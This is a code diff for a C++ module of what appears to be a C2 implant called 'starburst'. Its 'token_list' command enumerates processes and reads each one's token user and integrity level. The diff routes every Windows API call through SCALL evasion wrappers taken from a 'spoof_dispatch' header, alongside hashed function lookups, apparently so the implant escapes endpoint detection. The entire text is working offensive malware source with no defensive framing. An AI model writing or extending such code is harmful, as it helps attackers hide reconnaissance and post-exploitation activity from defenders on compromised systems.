@@ -4,6 +4,7 @@
 #include <parser.h>
 #include <config.h>
 #include <strings.h>
+#include <evasion/spoof_dispatch.h>
 
 #ifdef INCLUDE_CMD_TOKEN_LIST
 
@@ -26,7 +27,7 @@ auto declfn starburst::cmd_token_list(
         return;
     }
 
-    NTSTATUS status = inst.ntdll.NtQuerySystemInformation(
+    NTSTATUS status = (NTSTATUS)SCALL( inst, ntdll.NtQuerySystemInformation,
         SystemProcessInformation, buf, buf_size, &buf_size );
 
     while ( status == STATUS_INFO_LENGTH_MISMATCH ) {
@@ -38,7 +39,7 @@ auto declfn starburst::cmd_token_list(
                 symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
             return;
         }
-        status = inst.ntdll.NtQuerySystemInformation(
+        status = (NTSTATUS)SCALL( inst, ntdll.NtQuerySystemInformation,
             SystemProcessInformation, buf, buf_size, &buf_size );
     }
 
@@ -69,39 +70,39 @@ auto declfn starburst::cmd_token_list(
         if ( pid == 0 ) goto next;
 
         {
-            HANDLE h_proc = inst.kernel32.OpenProcess( PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid );
+            HANDLE h_proc = (HANDLE)SCALL( inst, kernel32.OpenProcess, PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid );
             HANDLE h_token = nullptr;
             char user_buf[128] = { 0 };
             uint32_t integrity = 0;
 
             if ( h_proc ) {
-                if ( inst.advapi32.OpenProcessToken( h_proc, TOKEN_QUERY, &h_token ) ) {
+                if ( SCALL( inst, advapi32.OpenProcessToken, h_proc, TOKEN_QUERY, &h_token ) ) {
                     // get user
                     uint8_t tok_info[256] = { 0 };
                     DWORD ret_len = 0;
-                    if ( inst.advapi32.GetTokenInformation(
+                    if ( SCALL( inst, advapi32.GetTokenInformation,
                             h_token, TokenUser, tok_info, sizeof(tok_info), &ret_len ) ) {
                         auto tok_user = reinterpret_cast<TOKEN_USER*>( tok_info );
                         wchar_t wname[128] = { 0 };
                         wchar_t wdom[128] = { 0 };
                         DWORD name_len = 128, dom_len = 128;
                         SID_NAME_USE snu;
-                        inst.advapi32.LookupAccountSidW(
+                        SCALL( inst, advapi32.LookupAccountSidW,
                             nullptr, tok_user->User.Sid,
                             wname, &name_len, wdom, &dom_len, &snu );
                         // domain\user
-                        inst.kernel32.WideCharToMultiByte(
+                        SCALL( inst, kernel32.WideCharToMultiByte,
                             CP_UTF8, 0, wdom, -1, user_buf, 60, nullptr, nullptr );
                         uint32_t dlen = str_len( user_buf );
                         user_buf[dlen] = '\\';
-                        inst.kernel32.WideCharToMultiByte(
+                        SCALL( inst, kernel32.WideCharToMultiByte,
                             CP_UTF8, 0, wname, -1, user_buf + dlen + 1, 60, nullptr, nullptr );
                     }
 
                     // get integrity level
                     uint8_t il_buf[256] = { 0 };
                     ret_len = 0;
-                    if ( inst.advapi32.GetTokenInformation(
+                    if ( SCALL( inst, advapi32.GetTokenInformation,
                             h_token, TokenIntegrityLevel, il_buf, sizeof(il_buf), &ret_len ) ) {
                         auto tml = reinterpret_cast<TOKEN_MANDATORY_LABEL*>( il_buf );
                         typedef PUCHAR ( WINAPI *fn_GetSidSubAuthorityCount )( PSID );
@@ -115,16 +116,16 @@ auto declfn starburst::cmd_token_list(
                                 reinterpret_cast<uintptr_t>( (HMODULE)inst.advapi32.handle ),
                                 expr::hash_string( "GetSidSubAuthority" ) ) );
                         if ( pGSSAC && pGSSA ) {
-                            auto sub_count = *pGSSAC( tml->Label.Sid );
+                            auto sub_count = *(PUCHAR)SCALL_PTR( inst, pGSSAC, tml->Label.Sid );
                             if ( sub_count > 0 ) {
-                                integrity = *pGSSA( tml->Label.Sid, sub_count - 1 );
+                                integrity = *(PDWORD)SCALL_PTR( inst, pGSSA, tml->Label.Sid, sub_count - 1 );
                             }
                         }
                     }
 
-                    inst.kernel32.CloseHandle( h_token );
+                    SCALL( inst, kernel32.CloseHandle, h_token );
                 }
-                inst.kernel32.CloseHandle( h_proc );
+                SCALL( inst, kernel32.CloseHandle, h_proc );
             }
 
             // format line: PID\tUser\tIntegrity\tProcess
@@ -160,7 +161,7 @@ auto declfn starburst::cmd_token_list(
 
                 // process name
                 if ( spi->ImageName.Buffer && spi->ImageName.Length > 0 ) {
-                    int plen = inst.kernel32.WideCharToMultiByte(
+                    int plen = (int)SCALL( inst, kernel32.WideCharToMultiByte,
                         CP_UTF8, 0, spi->ImageName.Buffer, spi->ImageName.Length / 2,
                         output + out_offset, out_cap - out_offset - 4, nullptr, nullptr );
                     out_offset += plen;
